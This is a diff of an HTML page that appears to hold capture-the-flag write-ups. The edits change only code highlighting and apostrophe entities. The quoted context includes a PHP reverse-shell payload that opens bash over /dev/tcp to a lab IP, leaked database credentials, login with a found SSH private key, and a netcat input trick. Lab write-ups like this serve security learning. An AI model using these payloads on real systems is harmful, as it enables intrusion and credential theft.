@@ -1371,7 +1371,7 @@ document[<span style="color:#a6e22e">getElementById</span>](<span style="color:#
 
 
 <p>After poking around a bit I came across some credentials in a php snippet:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 $db_connection <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>($db_connection, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
 </code></pre></div><p>This could be useful once I find a way to achieve code execution. For now I can&rsquo;t access the sql server since the port isn&rsquo;t exposed, and they don&rsquo;t work as ssh creds.</p>
@@ -1391,7 +1391,7 @@ $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_quer
 </figure>
 
 <p>It&rsquo;s fun and all, but I truly prefer a terminal so I switched to this payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1&#39;&#34;</span>);
 </code></pre></div>
 <figure class='left'>
@@ -1407,7 +1407,7 @@ $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_quer
 <hr>
 <h1 id="escalating-to-root">Escalating to Root</h1>
 <p>The deployer script looked promising:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
 $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
 $payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);
@@ -1825,7 +1825,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<p>An OpenSSH private key on his private git. Why hello there darlin&rsquo;, let&rsquo;s take you out for a spin. I copied the key into a new file with nano, saved and modified the permissions (ssh requires this to work), then attempted to log in via ssh:</p>
+<p>An OpenSSH private key on his private git. Why hello there darlin', let&rsquo;s take you out for a spin. I copied the key into a new file with nano, saved and modified the permissions (ssh requires this to work), then attempted to log in via ssh:</p>
 <p><code>root@wks104:~/craft# chmod 600 gilfoyle.keyroot@wks104:~/craft# ssh gilfoyle@craft.htb -i gilfoyle.key</code></p>
 
     <figure class="left" >
@@ -2246,7 +2246,7 @@ So, a quick recap:
 <p>This is the most portable version since <code>echo -e</code> will be available on all but extremely locked down/customzed linux distributions.</p>
 <p>The syntax is very simple:</p>
 <p><code>echo -e &quot;\x30\n&quot; | nc localhost 9001</code></p>
-<p>The big problem with it, we have to manually put 128 <code>\x00</code>'s in the command. That&rsquo;s messy, but doable. Using python I can print the string I need like so:</p>
+<p>The big problem with it, we have to manually put 128 <code>\x00</code>&rsquo;s in the command. That&rsquo;s messy, but doable. Using python I can print the string I need like so:</p>
 <p><code>print(b'\x00'*128 + b'\n')</code></p>
 
     <figure class="left" >
